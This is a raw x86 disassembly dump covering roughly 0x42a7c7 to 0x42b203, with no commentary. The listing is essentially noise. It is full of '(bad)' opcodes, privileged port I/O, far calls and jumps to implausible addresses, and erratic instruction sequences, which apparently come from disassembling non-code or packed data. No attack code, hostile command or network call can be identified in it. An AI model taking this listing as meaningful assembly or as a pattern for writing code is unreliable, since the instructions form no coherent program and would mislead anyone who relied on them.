  42a7c7:	adc    eax,0x37d570cc
  42a7cc:	pop    eax
  42a7cd:	and    DWORD PTR [ecx],0x66381f76
  42a7d3:	in     al,0x6b
  42a7d5:	sbb    bl,BYTE PTR [esi]
  42a7d7:	pop    ebp
  42a7d8:	push   esi
  42a7d9:	nop
  42a7da:	stc    
  42a7db:	mov    ch,0x2b
  42a7dd:	mov    ch,0xcb
  42a7df:	sub    al,0x80
  42a7e1:	ins    DWORD PTR es:[edi],dx
  42a7e2:	jl     0x42a7fd
  42a7e4:	fidiv  DWORD PTR [esi-0x2d]
  42a7e7:	mov    ds:0x45f173e5,eax
  42a7ec:	shl    DWORD PTR [eax-0x7],0xfc
  42a7f0:	lahf   
  42a7f1:	xchg   edi,eax
  42a7f2:	sub    edi,DWORD PTR [ebx]
  42a7f4:	cmc    
  42a7f5:	inc    edi
  42a7f6:	mov    cs,WORD PTR [esi-0x5f0a1fd4]
  42a7fc:	rdpmc  
  42a7fe:	or     DWORD PTR [ebp-0x440d8ce0],ecx
  42a804:	test   edx,esi
  42a806:	pop    edi
  42a807:	icebp  
  42a808:	cmp    edx,DWORD PTR [edi-0x24]
  42a80b:	loop   0x42a840
  42a80d:	and    ebx,ecx
  42a80f:	call   0xd52:0x6f7ac52b
  42a816:	mov    bl,0x4f
  42a818:	xor    bl,dh
  42a81a:	repnz lock in al,dx
  42a81d:	dec    ebx
  42a81e:	leave  
  42a81f:	test   eax,0x52bf006
  42a824:	aam    0xdd
  42a826:	daa    
  42a827:	mov    al,0x22
  42a829:	cmc    
  42a82a:	mov    ebx,0xebe954fe
  42a82f:	push   ss
  42a830:	popf   
  42a831:	pushf  
  42a832:	push   ss
  42a833:	shl    BYTE PTR [edx],1
  42a835:	call   FWORD PTR [ecx-0x1f633897]
  42a83b:	xor    bl,bh
  42a83d:	mov    al,0x3a
  42a83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a841:	(bad)  
  42a843:	dec    DWORD PTR [edx+0xb732665]
  42a849:	push   es
  42a84a:	fwait
  42a84b:	dec    esp
  42a84c:	dec    edx
  42a84d:	js     0x42a874
  42a84f:	div    DWORD PTR [ebx+edx*2+0x1cc4831a]
  42a856:	test   eax,0xb70bf4bc
  42a85b:	jle    0x42a7fc
  42a85d:	lods   al,BYTE PTR ds:[esi]
  42a85e:	xchg   BYTE PTR [esp+ebx*8-0x138cced],bl
  42a865:	cmc    
  42a866:	push   0xbbf0cb2b
  42a86b:	data16 shl BYTE PTR [edx],1
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0xfab16c97
  42a8e4:	loopne 0x42a91d
  42a8e6:	addr16 enter 0x1,0x0
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    BYTE PTR [edi+0x20d559a7],cl
  42a8f3:	seto   cl
  42a8f6:	add    dh,BYTE PTR [edi]
  42a8f8:	aas    
  42a8f9:	enter  0x31e9,0xfa
  42a8fd:	add    BYTE PTR [eax],al
  42a8ff:	jecxz  0x42a882
  42a901:	pushw  es
  42a903:	cli    
  42a904:	mov    esp,ecx
  42a906:	out    dx,al
  42a907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a908:	inc    esp
  42a909:	ja     0x42a912
  42a90b:	push   0xaccedd42
  42a910:	add    dh,BYTE PTR [edx]
  42a912:	out    dx,eax
  42a913:	sti    
  42a914:	test   BYTE PTR [edx-0xa822e1],ch
  42a91a:	pop    ss
  42a91b:	sbb    ebp,DWORD PTR [esi-0x2d]
  42a91e:	mov    ebx,0x999ea199
  42a923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a924:	pop    ds
  42a925:	repnz popf 
  42a927:	icebp  
  42a928:	pushf  
  42a929:	mov    edx,0x7e13b3ac
  42a92e:	mov    edx,0xfbc800c6
  42a933:	mov    BYTE PTR [edx-0x2d],al
  42a936:	mov    ds:0xaeabc4c6,eax
  42a93b:	js     0x42a9a3
  42a93d:	dec    edi
  42a93e:	cs ret 0x9bff
  42a942:	sub    dl,dl
  42a944:	lahf   
  42a945:	out    dx,eax
  42a946:	lock outs dx,DWORD PTR ds:[esi]
  42a948:	sbb    esp,DWORD PTR [esi-0x28]
  42a94b:	pop    ebp
  42a94c:	ffree  st(5)
  42a94e:	mov    edx,0x7aa09387
  42a953:	push   eax
  42a954:	xchg   esi,eax
  42a955:	dec    esi
  42a956:	cmp    al,0xa2
  42a958:	shl    BYTE PTR [esi+0x25f95f7],cl
  42a95e:	push   ss
  42a95f:	shr    DWORD PTR [eax],cl
  42a961:	test   al,0x6c
  42a963:	(bad)  
  42a964:	aaa    
  42a965:	jle    0x42a9b2
  42a967:	sbb    al,0xda
  42a969:	arpl   WORD PTR [edi+0x58],bx
  42a96c:	pusha  
  42a96d:	jg     0x42a911
  42a96f:	dec    ebp
  42a970:	add    al,0xa2
  42a972:	fbld   TBYTE PTR [ecx+0x13]
  42a975:	cmp    al,0x1c
  42a977:	jge    0x42a9e9
  42a979:	ds pushf 
  42a97b:	mov    edx,0xf2a521c1
  42a980:	lahf   
  42a981:	add    ebx,ebx
  42a983:	hlt    
  42a984:	clc    
  42a985:	aad    0xb5
  42a987:	inc    BYTE PTR [edx-0x4]
  42a98a:	inc    ebp
  42a98b:	xchg   esp,eax
  42a98c:	mov    ebp,ecx
  42a98e:	sub    ebp,DWORD PTR [edx+0x3126ab6e]
  42a994:	(bad)  
  42a996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a997:	sub    eax,0x21019d5c
  42a99c:	lea    ebp,[edi-0x3eb51b29]
  42a9a2:	sbb    cl,bl
  42a9a4:	pop    edi
  42a9a5:	inc    edx
  42a9a6:	push   ebx
  42a9a7:	nop
  42a9a8:	fwait
  42a9a9:	and    bl,cl
  42a9ab:	clc    
  42a9ac:	and    ebx,edx
  42a9ae:	xchg   ecx,eax
  42a9af:	arpl   WORD PTR [ebx-0x5cbd9504],dx
  42a9b5:	cwde   
  42a9b6:	ror    BYTE PTR [edi],1
  42a9b8:	inc    edi
  42a9b9:	push   ebx
  42a9ba:	jmp    0x42aa09
  42a9bc:	fisubr DWORD PTR [eax-0x27]
  42a9bf:	mov    dl,0x63
  42a9c1:	adc    eax,0xfa8db8a4
  42a9c6:	out    0x6d,eax
  42a9c8:	add    eax,0x8bda00cb
  42a9cd:	and    bl,ch
  42a9cf:	or     eax,0x2998fc0
  42a9d4:	int    0x5d
  42a9d6:	xchg   edi,eax
  42a9d7:	and    al,0x53
  42a9d9:	sub    bh,BYTE PTR [esi]
  42a9db:	call   0xf27c66
  42a9e0:	mov    WORD PTR [ecx+0x61],cs
  42a9e3:	jmp    0x6181fd2d
  42a9e8:	xchg   edi,eax
  42a9e9:	aaa    
  42a9ea:	js     0x42a96f
  42a9ec:	(bad)  
  42a9ed:	call   0x0:0x0
	...
  42aa54:	add    BYTE PTR [eax],al
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	pop    esi
  42aa63:	in     al,dx
  42aa64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa65:	in     eax,dx
  42aa66:	addr16 leave 
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	popa   
  42aa6f:	mov    eax,ds:0xa9d7c080
  42aa74:	f2xm1  
  42aa76:	fs stos DWORD PTR es:[edi],eax
  42aa78:	jecxz  0x42aaa3
  42aa7a:	ins    DWORD PTR es:[edi],dx
  42aa7b:	push   ss
  42aa7c:	cmp    al,0xf
  42aa7e:	(bad)  [edx+0xa]
  42aa81:	inc    ebx
  42aa82:	adc    BYTE PTR [ebp+0x4ae15d40],ch
  42aa88:	pop    eax
  42aa89:	push   eax
  42aa8a:	mov    eax,0x5e7278b6
  42aa8f:	mov    eax,DWORD PTR [edx+0x43]
  42aa92:	xchg   esi,eax
  42aa93:	mov    bl,ch
  42aa95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa96:	xlat   BYTE PTR ds:[ebx]
  42aa97:	push   ds
  42aa98:	fs jmp 0x42aa26
  42aa9b:	enter  0x5594,0x9
  42aa9f:	cwde   
  42aaa0:	cdq    
  42aaa1:	pop    ebp
  42aaa2:	add    al,0x2f
  42aaa4:	repnz sbb bl,BYTE PTR [edx]
  42aaa7:	jno    0x42ab17
  42aaa9:	xchg   edx,eax
  42aaaa:	jmp    0xd909cefe
  42aaaf:	mov    ds:0xae9575b4,al
  42aab4:	jmp    0x42aa99
  42aab6:	jmp    0xe9d4:0x5376381a
  42aabd:	pop    eax
  42aabe:	or     al,0x12
  42aac0:	ss arpl sp,dx
  42aac3:	sti    
  42aac4:	xchg   esi,eax
  42aac5:	dec    esp
  42aac6:	xor    al,0xff
  42aac8:	lahf   
  42aac9:	push   es
  42aaca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aacb:	repnz sbb eax,0x87cb3aa6
  42aad1:	lods   eax,DWORD PTR ds:[esi]
  42aad2:	(bad)  
  42aad3:	push   ebx
  42aad4:	ror    BYTE PTR [ecx-0x64034384],1
  42aada:	add    bl,ch
  42aadc:	sub    dl,0x78
  42aadf:	cmp    esi,esi
  42aae1:	ss push edx
  42aae3:	adc    ebx,DWORD PTR [ecx]
  42aae5:	jo     0x42ab4f
  42aae7:	and    BYTE PTR [eax+esi*8+0x5edd3874],ch
  42aaee:	hlt    
  42aaef:	and    eax,esp
  42aaf1:	or     esp,DWORD PTR [ecx+0x50b364c1]
  42aaf7:	leave  
  42aaf8:	js     0x42aae9
  42aafa:	adc    eax,0x815898ea
  42aaff:	mov    cl,0x43
  42ab01:	int3   
  42ab02:	push   esp
  42ab03:	sub    esi,DWORD PTR [ebx-0x22bcef11]
  42ab09:	dec    DWORD PTR [ecx]
  42ab0b:	or     edx,esp
  42ab0d:	mov    bl,0x23
  42ab0f:	out    0xba,al
  42ab11:	push   eax
  42ab12:	cmp    bl,BYTE PTR [ebx]
  42ab14:	adc    ch,dl
  42ab16:	mov    WORD PTR [edi+0xa5a62ec],ss
  42ab1c:	pusha  
  42ab1d:	or     BYTE PTR [edi-0x71],dl
  42ab20:	out    dx,eax
  42ab21:	inc    BYTE PTR [ecx+0x2a451ea2]
  42ab27:	repz clc 
  42ab29:	mov    ds:0xb1fb7a42,eax
  42ab2e:	enter  0xcc51,0xb4
  42ab32:	mov    al,ds:0xbe078355
  42ab37:	bound  esi,QWORD PTR [edi]
  42ab39:	pop    esp
  42ab3a:	icebp  
  42ab3b:	xor    edx,DWORD PTR [edi+0x2e]
  42ab3e:	xor    ebp,DWORD PTR [ecx-0x7512bb92]
  42ab44:	lods   eax,DWORD PTR ds:[esi]
  42ab45:	or     al,BYTE PTR [edx-0x34786dfc]
  42ab4b:	xchg   edi,eax
  42ab4c:	shl    BYTE PTR [edi],0x41
  42ab4f:	repnz xlat BYTE PTR ds:[ebx]
  42ab51:	dec    edi
  42ab52:	jl     0x42ab52
  42ab54:	or     eax,0xa6edfa3d
  42ab59:	adc    BYTE PTR [ecx+0x5afe5d2b],bl
  42ab5f:	add    bh,BYTE PTR [esi+0x19]
  42ab62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab63:	cmp    BYTE PTR [ebp-0x54],0x1b
  42ab67:	xor    bh,BYTE PTR [ebp+0x49]
  42ab6a:	popa   
  42ab6b:	inc    eax
  42ab6c:	int    0x65
	...
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	aas    
  42abe3:	out    0xc2,eax
  42abe5:	jae    0x42ac4e
  42abe7:	retf   0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	clc    
  42abef:	mov    cl,0x68
  42abf1:	lods   eax,DWORD PTR ds:[esi]
  42abf2:	shl    DWORD PTR [edx],1
  42abf4:	mov    ch,al
  42abf6:	fcomp  st(2)
  42abf8:	sbb    eax,0xb30f0888
  42abfd:	push   esp
  42abfe:	inc    ecx
  42abff:	lahf   
  42ac00:	ins    DWORD PTR es:[edi],dx
  42ac01:	fldenv [edi+0x16]
  42ac04:	ss (bad) 
  42ac06:	dec    edx
  42ac07:	enter  0xb892,0xa7
  42ac0b:	shr    BYTE PTR [edx+edx*4+0x63e12525],0x2b
  42ac13:	jp     0x42ac4b
  42ac15:	lods   eax,DWORD PTR ds:[esi]
  42ac16:	lock mov DWORD PTR [ecx-0x7bb02479],ecx
  42ac1d:	fiadd  WORD PTR [ebx]
  42ac1f:	fisubr WORD PTR [edi+0x15]
  42ac22:	sbb    eax,0xead76864
  42ac27:	pop    ecx
  42ac28:	pusha  
  42ac29:	jmp    0x43ea4d44
  42ac2e:	das    
  42ac2f:	imul   esi,edi,0x2d
  42ac32:	or     al,0x25
  42ac34:	call   0x3879f200
  42ac39:	jnp    0x42ac7f
  42ac3b:	cdq    
  42ac3c:	(bad)  
  42ac3d:	sub    bh,BYTE PTR [edi+0x18]
  42ac40:	dec    ecx
  42ac41:	jne    0x42abdc
  42ac43:	pop    edx
  42ac44:	test   eax,0xf187a428
  42ac49:	mov    ch,ah
  42ac4b:	adc    BYTE PTR [ebx+0x5d29cddb],cl
  42ac51:	fild   WORD PTR [eax+0x1c]
  42ac54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac55:	and    DWORD PTR [eax+0x3c],0x7c
  42ac59:	mov    edx,0x9d4601ce
  42ac5e:	loopne 0x42abec
  42ac60:	mov    al,0xaa
  42ac62:	ds aam 0x6b
  42ac65:	or     ch,BYTE PTR ds:0x78fc56aa
  42ac6b:	imul   esp,DWORD PTR [edi-0x290ffa6b],0x9815f76a
  42ac75:	fadd   QWORD PTR [eax]
  42ac77:	mov    ds:0x5d7a4ed2,al
  42ac7c:	pop    es
  42ac7d:	or     ch,BYTE PTR [ebp+0x5e412fc6]
  42ac83:	adc    ebx,DWORD PTR [edx-0x6b4ce9dd]
  42ac89:	jg     0x42ac15
  42ac8b:	ror    BYTE PTR [esi+0x6],cl
  42ac8e:	clc    
  42ac8f:	pop    ds
  42ac90:	pop    eax
  42ac91:	leave  
  42ac92:	cmp    eax,0x7fdd99a1
  42ac97:	sub    DWORD PTR [eax],ebx
  42ac99:	out    dx,eax
  42ac9a:	lds    eax,FWORD PTR [eax]
  42ac9c:	push   ds
  42ac9d:	hlt    
  42ac9e:	scas   al,BYTE PTR es:[edi]
  42ac9f:	dec    ecx
  42aca0:	xchg   ebx,eax
  42aca1:	aam    0xfd
  42aca3:	cmp    esi,DWORD PTR [ebx+0x4d]
  42aca6:	sbb    BYTE PTR [eax-0x2f],0x46
  42acaa:	mov    bh,dh
  42acac:	ficomp WORD PTR [edx-0x15]
  42acaf:	mov    edi,0x9e013252
  42acb4:	sbb    eax,0x48756d0b
  42acb9:	xor    DWORD PTR [edx-0x3c6fe7d3],0xffffffcc
  42acc0:	adc    dh,dh
  42acc2:	adc    ah,al
  42acc4:	push   ebx
  42acc5:	jg     0x42ace6
  42acc7:	out    dx,al
  42acc8:	jb     0x42ac6e
  42acca:	or     eax,0x4ccb5162
  42accf:	jb     0x42ac84
  42acd1:	imul   edx,ebp,0x8ebedb2b
  42acd7:	jbe    0x42acc5
  42acd9:	in     eax,0x4d
  42acdb:	cmp    DWORD PTR [edi-0x34],ebx
  42acde:	sbb    BYTE PTR [esi],0x83
  42ace1:	pop    ebx
  42ace2:	jne    0x42acb8
  42ace4:	push   esi
  42ace5:	xor    BYTE PTR [ecx-0x24],cl
  42ace8:	and    eax,0x75a8751
  42aced:	pop    ebx
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	xchg   edx,eax
  42ad63:	jmp    0xcbaa2dca
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	aam    0x54
  42ad70:	cmp    eax,DWORD PTR [edx]
  42ad72:	rol    BYTE PTR [edx+eax*1+0x6b8dc4c9],0xce
  42ad7a:	jge    0x42ad1b
  42ad7c:	sub    eax,0xd218625
  42ad81:	jmp    0x42ada9
  42ad83:	xchg   edx,eax
  42ad84:	cmp    DWORD PTR [eax],0x87ed615c
  42ad8a:	in     al,dx
  42ad8b:	pop    ds
  42ad8c:	out    0x1a,eax
  42ad8e:	loopne 0x42ad4c
  42ad90:	popf   
  42ad91:	mov    edi,0x63ccb6a1
  42ad96:	push   edx
  42ad97:	mov    al,0xe
  42ad99:	sahf   
  42ad9a:	and    ah,BYTE PTR [ecx+edi*2]
  42ad9d:	xor    al,0xc8
  42ad9f:	fdivr  DWORD PTR [eax-0x31]
  42ada2:	add    DWORD PTR [ecx],esp
  42ada4:	(bad)  [ecx+0x1b2405b4]
  42adaa:	(bad)  
  42adac:	add    DWORD PTR [esi],edi
  42adae:	mov    cl,0x83
  42adb0:	outs   dx,DWORD PTR ds:[esi]
  42adb1:	hlt    
  42adb2:	xor    BYTE PTR [edx-0x1fffb242],bh
  42adb8:	cmp    BYTE PTR ds:0x5e12aece,cl
  42adbe:	or     al,0x1b
  42adc0:	test   BYTE PTR [edx],dh
  42adc2:	shl    BYTE PTR [ebp+ecx*4-0x1f],cl
  42adc6:	std    
  42adc7:	push   esi
  42adc8:	inc    eax
  42adc9:	sub    BYTE PTR ds:0xc1fb46c3,cl
  42adcf:	pop    esp
  42add0:	push   cs
  42add1:	cs inc eax
  42add3:	lods   al,BYTE PTR ds:[esi]
  42add4:	mov    bl,0x6a
  42add6:	and    BYTE PTR [ecx+0x7be05466],bl
  42addc:	and    DWORD PTR [esi-0x78],ecx
  42addf:	xor    ebp,eax
  42ade1:	add    ah,BYTE PTR [eax]
  42ade3:	rol    BYTE PTR [esp+ecx*8+0x89ac684],0x7
  42adeb:	jbe    0x42ad7e
  42aded:	push   edx
  42adee:	mov    eax,ds:0xd5e69706
  42adf3:	sbb    eax,0xb1f7acd6
  42adf8:	dec    esi
  42adf9:	bound  esi,QWORD PTR ds:0xefe4eb0e
  42adff:	push   esi
  42ae00:	dec    ebx
  42ae01:	lods   al,BYTE PTR ds:[esi]
  42ae02:	add    edi,ebp
  42ae04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae05:	xor    eax,0x228cfedd
  42ae0a:	adc    ecx,DWORD PTR [ebp-0x64]
  42ae0d:	sub    dl,BYTE PTR [ebx+0x2966ec04]
  42ae13:	push   ebp
  42ae14:	test   ch,dh
  42ae16:	fs cli 
  42ae18:	pusha  
  42ae19:	rcr    cl,0xf9
  42ae1c:	popf   
  42ae1d:	jge    0x42ae2e
  42ae1f:	iret   
  42ae20:	pushf  
  42ae21:	imul   ebx,DWORD PTR [edi-0x202e6e56],0x6d0b8dc6
  42ae2b:	cwde   
  42ae2c:	ja     0x42ae85
  42ae2e:	mov    cl,0x8b
  42ae30:	jns    0x42ae15
  42ae32:	(bad)  
  42ae33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae34:	adc    bl,BYTE PTR [edx-0x61]
  42ae37:	xor    al,0xc1
  42ae39:	out    dx,eax
  42ae3a:	adc    DWORD PTR [edx],eax
  42ae3c:	sbb    bh,bl
  42ae3e:	nop
  42ae3f:	scas   al,BYTE PTR es:[edi]
  42ae40:	std    
  42ae41:	sub    DWORD PTR [ecx],0xe4ba7cc8
  42ae47:	jae    0x42ae31
  42ae49:	adc    al,BYTE PTR [ebp-0x207657b6]
  42ae4f:	test   BYTE PTR ds:[ebp+0x3572e1e],cl
  42ae56:	(bad)  
  42ae58:	dec    edi
  42ae59:	cmc    
  42ae5a:	mov    dh,0x44
  42ae5c:	push   edx
  42ae5d:	test   ebp,esp
  42ae5f:	cmc    
  42ae60:	rcr    BYTE PTR [edi],cl
  42ae62:	add    DWORD PTR [edx*1+0x2cd505a3],eax
  42ae69:	dec    edx
  42ae6a:	imul   ebx,DWORD PTR [edi-0x1f],0x5c
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	test   DWORD PTR [edx-0x52],ebp
  42aee5:	out    0x67,eax
  42aee7:	int3   
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	jg     0x42af20
  42aef0:	dec    edx
  42aef1:	iret   
  42aef2:	lods   eax,DWORD PTR ds:[esi]
  42aef3:	test   DWORD PTR [ecx-0x63ba6c23],ecx
  42aef9:	mov    esi,0x44fb00b3
  42aefe:	cwde   
  42aeff:	cwde   
  42af00:	aad    0x64
  42af02:	xchg   edi,eax
  42af03:	sub    al,0x53
  42af05:	adc    eax,0x3b78acc3
  42af0a:	and    dl,BYTE PTR [ebx]
  42af0c:	mov    edi,edx
  42af0e:	fnstsw ax
  42af10:	out    0xe1,al
  42af12:	pop    esi
  42af13:	loope  0x42af4e
  42af15:	mov    ah,0x36
  42af17:	adc    eax,0x6bdb7571
  42af1c:	sub    ebp,DWORD PTR [esi]
  42af1e:	adc    al,0x22
  42af20:	sub    eax,0xd12ac5e2
  42af25:	je     0x42af50
  42af27:	mov    al,ds:0xb14312a1
  42af2c:	jo     0x42af52
  42af2e:	sub    DWORD PTR [eax*8-0x7c82bee9],ecx
  42af35:	popf   
  42af36:	mov    esp,0xc36df795
  42af3b:	jecxz  0x42af3d
  42af3d:	pop    es
  42af3e:	sub    edi,DWORD PTR [edi]
  42af40:	out    0xdf,al
  42af42:	fisubr DWORD PTR [ecx+0x1c34a6a4]
  42af48:	inc    ebx
  42af49:	xchg   esi,eax
  42af4a:	push   cs
  42af4b:	adc    BYTE PTR [ebp-0x2ff1bc3d],dh
  42af51:	inc    ebx
  42af52:	adc    BYTE PTR [edi+0x2e],dh
  42af55:	add    ebp,DWORD PTR [ebx-0x6c641d88]
  42af5b:	out    0x1d,eax
  42af5d:	or     al,0x11
  42af5f:	cwde   
  42af60:	xor    BYTE PTR [ecx+0xd01847],ah
  42af66:	dec    esp
  42af67:	aas    
  42af68:	in     eax,0xbe
  42af6a:	cmp    edx,DWORD PTR [eax-0xda02cdc]
  42af70:	cmp    DWORD PTR [esi-0x15fe8d1b],ebp
  42af76:	pop    ss
  42af77:	inc    edx
  42af78:	rcr    BYTE PTR [ebx+0x27666d08],cl
  42af7e:	cs mov esp,0x43e27e0e
  42af84:	(bad)  
  42af85:	out    0xd1,al
  42af87:	imul   esi,DWORD PTR [esi-0x56],0xffffffa4
  42af8b:	push   ss
  42af8c:	mov    WORD PTR [eax+0x4ea1fa8c],?
  42af92:	mov    eax,0xeb4d96a9
  42af97:	add    BYTE PTR ds:0x21179f4d,bh
  42af9d:	sbb    eax,0xa896f9ef
  42afa2:	cli    
  42afa3:	push   ecx
  42afa4:	cld    
  42afa5:	push   ecx
  42afa6:	mov    BYTE PTR [ecx+eax*1+0x2dafb136],dl
  42afad:	adc    edx,DWORD PTR [ebx]
  42afaf:	(bad)  
  42afb0:	imul   eax,edi,0xce60edcd
  42afb6:	fcmovb st,st(4)
  42afb8:	stos   BYTE PTR es:[edi],al
  42afb9:	xlat   BYTE PTR ds:[ebx]
  42afba:	xor    dl,BYTE PTR [edx]
  42afbc:	push   ss
  42afbd:	fnsave [esi-0x2b]
  42afc0:	inc    esp
  42afc1:	daa    
  42afc2:	lahf   
  42afc3:	popa   
  42afc4:	cs jp  0x42afb4
  42afc7:	or     al,0x3b
  42afc9:	es sbb dl,ah
  42afcc:	add    al,0xcc
  42afce:	cdq    
  42afcf:	or     BYTE PTR [ecx+eiz*8],cl
  42afd2:	cmc    
  42afd3:	mov    esi,0x437b2574
  42afd8:	jb     0x42b043
  42afda:	sbb    al,0x2d
  42afdc:	xchg   ebp,eax
  42afdd:	push   esp
  42afde:	xor    bl,BYTE PTR [esi-0x715b3ab6]
  42afe4:	and    cl,0x3e
  42afe7:	jl     0x42afd9
  42afe9:	ins    DWORD PTR es:[edi],dx
  42afea:	push   esp
  42afeb:	test   al,0x13
  42afed:	sub    BYTE PTR [eax],al
	...
  42b053:	add    BYTE PTR [eax],al
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	shl    BYTE PTR [eax-0x32989476],1
  42b068:	add    DWORD PTR [eax],eax
  42b06a:	add    BYTE PTR [ecx],al
  42b06c:	add    BYTE PTR [eax],al
  42b06e:	jl     0x42b0e6
  42b070:	pop    edi
  42b071:	fstp   TBYTE PTR [edx+0x5d44d0b9]
  42b077:	enter  0xb898,0xed
  42b07b:	cwde   
  42b07c:	adc    al,0xc6
  42b07e:	fsub   DWORD PTR [ecx-0x2f74616c]
  42b084:	mov    bh,bh
  42b086:	pop    ss
  42b087:	dec    ebp
  42b088:	xor    ch,ch
  42b08a:	inc    ebp
  42b08b:	mov    eax,0xe10ec904
  42b090:	mov    ds:0xa9270cb4,al
  42b095:	xchg   ebx,edi
  42b097:	dec    ecx
  42b098:	idiv   cl
  42b09a:	mov    ch,0xe6
  42b09c:	cmc    
  42b09d:	mov    eax,0x75b771da
  42b0a2:	ja     0x42b0d7
  42b0a4:	bound  edi,QWORD PTR [esi-0x7f]
  42b0a7:	sub    ebx,DWORD PTR [esi]
  42b0a9:	mov    eax,ds:0xb2706530
  42b0ae:	jno    0x42b0bc
  42b0b0:	fisubr DWORD PTR [esi-0x30]
  42b0b3:	int    0xf
  42b0b5:	jb     0x42b08a
  42b0b7:	test   eax,0x97967491
  42b0bc:	lahf   
  42b0bd:	mov    edi,0x63572162
  42b0c2:	sbb    BYTE PTR [eax+0x16],cl
  42b0c5:	mov    edi,esp
  42b0c7:	(bad)  
  42b0c8:	jge    0x42b10c
  42b0ca:	pop    esp
  42b0cb:	test   BYTE PTR [esi+0x940e631],dh
  42b0d1:	popf   
  42b0d2:	sti    
  42b0d3:	sub    eax,0x7294ab64
  42b0d8:	pop    es
  42b0d9:	xchg   edi,eax
  42b0da:	fimul  WORD PTR [esi-0x55e88617]
  42b0e0:	adc    DWORD PTR [ecx-0x2f],ebp
  42b0e3:	fs sub al,0xfe
  42b0e6:	xor    cl,BYTE PTR [edi]
  42b0e8:	inc    edx
  42b0e9:	pop    edi
  42b0ea:	js     0x42b0c5
  42b0ec:	xor    al,0x5f
  42b0ee:	push   ebp
  42b0ef:	dec    edx
  42b0f0:	dec    ebx
  42b0f1:	sbb    al,0xd4
  42b0f3:	nop
  42b0f4:	dec    ecx
  42b0f5:	sbb    al,BYTE PTR [ecx-0x78]
  42b0f8:	jmp    0xee85:0xdb546671
  42b0ff:	outs   dx,DWORD PTR ds:[esi]
  42b100:	jge    0x42b170
  42b102:	ins    DWORD PTR es:[edi],dx
  42b103:	fidivr WORD PTR [edi+edi*4+0x7]
  42b107:	lds    edx,FWORD PTR [eax]
  42b109:	iret   
  42b10a:	gs push esp
  42b10c:	cmc    
  42b10d:	mov    ecx,0xbb8ca0cf
  42b112:	jmp    0x42b0a4
  42b114:	ss es pop eax
  42b117:	jp     0x42b168
  42b119:	cdq    
  42b11a:	dec    esp
  42b11b:	call   0xf811:0xaae8d460
  42b122:	fsubr  QWORD PTR [esi+0x14075ddc]
  42b128:	test   al,0x2c
  42b12a:	sub    dl,BYTE PTR [edx+0x2a]
  42b12d:	leave  
  42b12e:	dec    eax
  42b12f:	xor    DWORD PTR [ebx+eax*8+0x3e],ebx
  42b133:	xchg   DWORD PTR [ebp+0x1e],edx
  42b136:	in     eax,0xf8
  42b138:	scas   eax,DWORD PTR es:[edi]
  42b139:	dec    edi
  42b13a:	dec    esp
  42b13b:	fcomp  st(5)
  42b13d:	jge    0x42b106
  42b13f:	adc    al,0xa2
  42b141:	xor    DWORD PTR [esp+edx*2-0x5c],0x5e33a419
  42b149:	xchg   ebx,eax
  42b14a:	std    
  42b14b:	add    eax,0x9ae6e9f4
  42b150:	popaw  
  42b152:	fwait
  42b153:	std    
  42b154:	xchg   BYTE PTR [ecx+edx*1],bh
  42b157:	jne    0x42b16f
  42b159:	imul   edx,DWORD PTR [esi-0x64426d62],0x9a0448b0
  42b163:	mov    ah,BYTE PTR [ebp-0x7c]
  42b166:	imul   ecx,edx,0xa
  42b169:	stos   BYTE PTR es:[edi],al
  42b16a:	mov    ebx,0xca26d0
	...
  42b1d3:	add    BYTE PTR [eax],al
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	jmp    0x42b208
  42b1e4:	cwde   
  42b1e5:	mov    eax,ds:0x1ce67
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	es jl  0x42b181
  42b1f1:	push   ebx
  42b1f2:	in     al,0x80
  42b1f4:	out    dx,al
  42b1f5:	rep outs dx,BYTE PTR ds:[esi]
  42b1f7:	dec    ebp
  42b1f8:	das    
  42b1f9:	add    eax,0x9add51d6
  42b1fe:	call   0x877bbcf9
  42b203:	push   0x409d0fde
